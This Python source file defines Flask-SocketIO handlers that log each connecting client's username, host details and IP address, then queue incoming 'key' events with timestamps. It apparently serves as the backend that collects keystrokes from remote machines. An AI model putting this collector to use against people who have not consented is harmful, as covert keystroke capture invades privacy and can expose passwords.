from datetime import datetime
from queue import Queue

from flask import request, session
from flask_socketio import SocketIO, emit

from backend.data.repository import db_manager
from backend.data.queue_manager import event_queue


def register_socket_handlers(sio: SocketIO):
    @sio.on('connect')
    def handle_connect():
        processor = request.headers.get('Processor')
        username = request.headers.get('Username')
        system = request.headers.get('System')
        node = request.headers.get('Node')
        release = request.headers.get('Release')
        version = request.headers.get('Version')
        machine = request.headers.get('Machine')
        ip_address = request.remote_addr
        timestamp = int(datetime.now().timestamp())
        connection_id = db_manager.init_connection(timestamp, username, processor, system, node, release, version, machine,
                                                   ip_address)

        session['connection_id'] = connection_id
        print("New connection:", connection_id, username, ip_address)

    @sio.on('disconnect')
    def handle_disconnect():
        connection_id = session.get('connection_id')
        print("Client disconnected:", connection_id)
        if connection_id:
            db_manager.close_connection(connection_id)
            print("Connection closed:", connection_id)

    @sio.on('ev')
    def handle_event(message):
        print(f'Received event from {session.get("connection_id")}: {message}')
        connection_id = int(session.get('connection_id'))
        timestamp = int(datetime.now().timestamp())
        if connection_id:
            event_queue.put(
                type('Event', (object,), {
                    'connection_id': connection_id,
                    'key': message.get('key'),
                    'timestamp': timestamp
                })()
            )
            emit('ack', {'status': 'received'})

